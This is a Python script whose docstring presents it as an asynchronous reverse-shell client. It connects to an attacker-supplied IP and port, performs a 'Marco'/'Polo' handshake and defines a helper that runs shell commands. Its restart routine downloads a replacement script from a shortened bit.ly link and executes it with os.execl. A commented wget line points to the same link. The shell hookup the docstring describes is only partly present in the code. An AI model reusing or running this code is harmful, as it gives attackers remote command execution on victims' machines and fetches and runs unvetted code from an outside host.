"""
Async client for reverse shelling ୧༼ಠ益ಠ༽︻╦╤─

Expects server ip and port as command line arguments
Executes /bin/bash and hooks up stdin/stderr/stdout to network sockets

Updates/changes by executing the .py downloaded from REMOTE
"""

import urllib.request
import asyncio
import sys
import os
import logging

HOST = sys.argv[1]
PORT = sys.argv[2]

REMOTE = "https://bit.ly/2Cp4hXU"


def restart(file_url=REMOTE, generation=0):
    script_name = "client{}.py".format(generation)
    urllib.request.urlretrieve(file_url, script_name)
    pythonpath = sys.executable
    os.execl(pythonpath, pythonpath, script_name, HOST, PORT)


logformat = logging.Formatter("%(asctime)s %(levelname)s:%(name)s: %(message)s")
logger = logging.getLogger("client")
logger.setLevel(logging.DEBUG)
fh = logging.FileHandler('client.log')
fh.setLevel(logging.DEBUG)
fh.setFormatter(logformat)
logger.addHandler(fh)

logger.info(sys.version_info)


async def main():
    try:
        await connect_to_server("Marco", loop=asyncio.get_event_loop())
    except ConnectionRefusedError:
        restart()


async def connect_to_server(message, loop):

    try:
        reader, writer = await asyncio.open_connection(HOST, PORT, loop=loop)
    except ConnectionRefusedError as err:
        logger.debug(err)
        return

    print("Sending: {}".format(message))
    writer.write(message.encode())
    await writer.drain()

    try:
        data = await reader.readexactly(4)
        assert data.decode() == 'Polo'
    except AssertionError as err:
        logger.error(err)
        return
    print("Received polo")


async def capture_subp(command):
    process = await asyncio.create_subprocess_shell(
        command,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT
    )
    stdout, stderr = await process.communicate()
    return process.returncode, stdout


# async def update():
#    asyncio.create_subprocess_shell("wget www.google.com",
#                                    stdin=subprocess.PIPE)
# Receive from wget https://bit.ly/2Cp4hXU


if __name__ == "__main__":
    import pathlib
    import sys

    assert sys.version_info >= (3, 7), "Pls"
    here = pathlib.Path(__file__).parent
    logpath = here.joinpath("client.log")

    asyncio.run(main())

# socket family is AF_INET (ipv4)
# socket type is SOCK_STREAM (connection oriented TCP protocol)
